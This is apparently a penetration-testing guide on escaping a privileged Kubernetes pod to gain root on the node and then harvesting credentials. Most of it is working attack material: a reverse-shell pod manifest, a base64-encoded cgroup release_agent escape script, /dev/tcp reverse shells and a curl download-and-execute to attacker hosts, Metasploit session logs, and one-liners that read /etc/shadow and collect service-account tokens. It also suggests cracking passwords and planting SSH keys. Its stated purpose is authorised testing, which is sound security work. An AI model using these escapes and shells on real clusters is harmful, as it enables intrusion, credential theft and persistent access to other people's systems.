## You can create a pod with only privileged: true

If you only have `privileged=true`, you can get interactive root access on the node, but you must jump through a few hoops first. You can use Felix Wilhelm's exploit PoC undock.sh to execute one command a time, or you  can use Brandon Edwards and Nick Freeman’s version which forces the host to connect back to the a listener on the pod for an easy upgrade to interactive root access on the host. Another option is to use the Metasploit module “docker privileged container escape” which uses the same exploit to upgrade a shell received from a container to a shell on the host. 

In either case, the kubernetes privesc paths as the same as with the other pods where you get root access on the node. One promising privesc path is available if you can schedule your pod to run on the control plane node using the `nodeName` selector (not possible in most cloud hosted k8s environments). Even if you can only schedule your pod on the worker node, you can access the node's kubelet credentials or you can create mirror/static pods in any namespace. You can also access any secret mounted within any pod on the node you are on. **In a production cluster, even on a worker node, there is usually at least one pod that has a `token` mounted that is bound to a `service account` that is bound to a `clusterrolebinding`, that gives you access to do things like create pods or view secrets in all namespaces**.  

# Pod Creation

## Create a pod you can exec into
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-priv
  labels: 
    app: pentest
spec:
  containers:
  - name: priv
    image: ubuntu
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    securityContext:
      privileged: true
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
  ```
[pod-priv.yaml](pod-priv.yaml)

#### Option 1: Create pod from local yaml 
```bash
kubectl apply -f pod-priv.yaml   
```

#### Option 2: Create pod from github hosted yaml
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/priv/pod-priv.yaml  
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-priv -- bash
```

## Or, create a reverse shell pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-priv-and-hostpid-revshell
  labels: 
    app: pentest
spec:
  hostPID: true
  containers:
  - name: priv-and-hostpid-revshell
    image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    securityContext:
      privileged: true
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
  restartPolicy: Always
```
[pod-priv-revshell.yaml](pod-priv-revshell.yaml)

#### Set up listener
```bash
nc -nvlp 3116
```

#### Create the pod
```bash
# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
```

#### Catch the shell 
```bash
~ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post exploitation

So this could be a limitation of my linux-fu, but I have not been able to use Felix's exploit to directly spawn a remote connection of any kind. However, there are three good options when it comes to post exploitation: 

* Use Felix Wilhelm's undock.sh and hunt around with non-interactive access
* Use the metasploit module: docker_privileged_container_escape
* Use undock.sh to download your own reverse shell script and then execute it spawn the reverse shell


### Option 1: Use Felix Wilhelm's undock.sh and hunt around with non-interactive access

#### Create undock script that will automate the container escape POC
```bash
echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > undock.sh 
```
#### Then use the script to run whatever commands you want on the host: 
```bash
sh undock.sh "cat /etc/shadow"
```

### Option 2: Use Brandon Edwards and Nick Freeman’s version which upgrades you to an interactive shell

#### Create escape script that will use the container escape POC to execute a connect back script on the host

Drop this into `escape.sh`:

```bash
#!/bin/bash
overlay=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
mkdir /tmp/escape
mount -t cgroup -o blkio cgroup /tmp/escape
mkdir -p /tmp/escape/w
echo 1 > /tmp/escape/w/notify_on_release
echo "$overlay/shell.sh" > /tmp/escape/release_agent
sleep 3 && echo 0 >/tmp/escape/w/cgroup.procs &
nc -l -p 9001
```
#### Find the IP address of your POD
This next script, `shell.sh` is executed on the host node and it will call back to the listener on your pod, so you'll need to use the pod's IP


#### Create the connect back script
Drop this into `/shell.sh` on the pod. If you change the name of your script, change it in escape.sh as well. 
```
#!/bin/bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.100.254.137/9001 0>&1"
```

#### Make both scripts executable
```bash
chmod +x shell.sh escape.sh
```

#### Execute escape.sh from the pod, which spin up a listener for you and then make the host to execute shell.sh

```bash
root@pod-priv:/# ./escape.sh
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@k8s-worker:/# cat var/lib/kubelet/pods/998357c8-45c7-4089-9651-cb8b185f7da8/volumes/kubernetes.io~secret/default-token-qqgjc/token
eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[REDACTED]
```

### Option 3: Use the metasploit module: docker_privileged_container_escape

#### Fire up your multi handler, using the -z flag to avoid interacting with the session
```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.127
LHOST => 10.0.0.127
msf6 exploit(multi/handler) > set port 4444
port => 4444
msf6 exploit(multi/handler) > run -jz
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.0.0.127:4444
```

#### From the pod, fire up a reverse shell
```bash
root@pod-priv:/# /bin/sh -i >& /dev/tcp/10.0.0.127/4444 0>&1
```

#### Catch shell from pod and spawn a shell on the host
```bash
[*] Started reverse TCP handler on 10.0.0.127:4444
msf6 exploit(multi/handler) > [*] Command shell session 1 opened (10.0.0.127:4444 -> 10.0.0.162:24316) at 2020-11-20 11:26:52 -0500

msf6 exploit(multi/handler) > use exploit/linux/local/docker_privileged_container_escape
[*] No payload configured, defaulting to linux/armle/meterpreter/reverse_tcp
msf6 exploit(linux/local/docker_privileged_container_escape) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/docker_privileged_container_escape) > set session 1
session => 1
msf6 exploit(linux/local/docker_privileged_container_escape) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 10.0.0.127:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Inside Docker container and target appears vulnerable
[*] Writing payload executable to '/tmp/wsKXoIW'
[*] Writing '/tmp/wsKXoIW' (286 bytes) ...
[*] Executing script to exploit privileged container
[*] Searching for payload on host
[*] Sending stage (3008420 bytes) to 10.0.0.162
[*] Meterpreter session 2 opened (10.0.0.127:4444 -> 10.0.0.162:47308) at 2020-11-20 11:28:18 -0500
[*] Sending stage (3008420 bytes) to 10.0.0.162
[*] Meterpreter session 3 opened (10.0.0.127:4444 -> 10.0.0.162:47310) at 2020-11-20 11:28:18 -0500
[*]
[*] Waiting 20s for payload

meterpreter > shell
Process 3068510 created.
Channel 1 created.
whoami
root
hostname
k8s-worker
cat var/lib/kubelet/pods/998357c8-45c7-4089-9651-cb8b185f7da8/volumes/kubernetes.io~secret/default-token-qqgjc/token
eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[REDACTED]
```

### Option 4: Use undock.sh to download your own payload and then execute it spawn the reverse shell 
I'm not sure why you would need this forth option, but I use this before I found Brandon Edwards and Nick Freeman's talk. It works, just adds an unecessary callback to a remote server. 

#### Create a payload and host it on your remote box
```bash
echo "0<&209-;exec 209<>/dev/tcp/10.0.0.127/4444;sh <&209 >&209 2>&209" > rshell.sh
python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```
#### Use undock.sh to download the script to the host and then execute it in the context of the host
```bash
root@pod-priv:/# sh undock.sh "curl -sL http://10.0.0.127:8000/rshell.sh -o /tmp/rshell.sh"
root@pod-priv:/# sh undock.sh "bash -c /tmp/rshell.sh"
```

#### Catch the shell, do some damage
```bash
nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.0.0.127] from (UNKNOWN) [10.0.0.162] 48572
id
uid=0(root) gid=0(root) groups=0(root)
hostname
k8s-worker
```

## What to look for on a node

### Look for kubeconfig's in the host filesystem 
If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)

```bash
find / -name kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/merged/var/lib/kube-proxy/kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/var/lib/node-problem-detector/kubeconfig
/var/lib/kubelet/kubeconfig
/var/lib/kube-proxy/kubeconfig
/home/kubernetes/containerized_mounter/rootfs/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/mnt/stateful_partition/var/lib/node-problem-detector/kubeconfig
/mnt/stateful_partition/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
```
### Find all tokens from all pods and see what permissions they have assigned to them
Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system

#### Grab all tokens from all pods on the system
This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
```bash
tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
```

```
default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
```

#### For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
```bash
cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
```
```
eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[redacted]
```

#### System where you have kubectl installed:
```bash
DTOKEN=`echo eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[redacted]`
kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
```

Does the token allow you to view secrets in that namespace? How about other namespaces?
Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?


For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
```bash
DTOKEN=`cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
```
Does the token allow you to view secrets in that namespace? How about other namespaces?
Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?


#### Some other ideas:
* Add your public key authorized_keys on the node and ssh to it
* Crack passwords in /etc/shadow, see if you can use them to access control-plane nodes
* Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 


#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster


# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.


# Reference(s): 
* https://twitter.com/_fel1x/status/1151487051986087936
* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 
* https://www.youtube.com/watch?v=BQlqita2D2s
* https://www.rapid7.com/db/modules/exploit/linux/local/docker_privileged_container_escape/
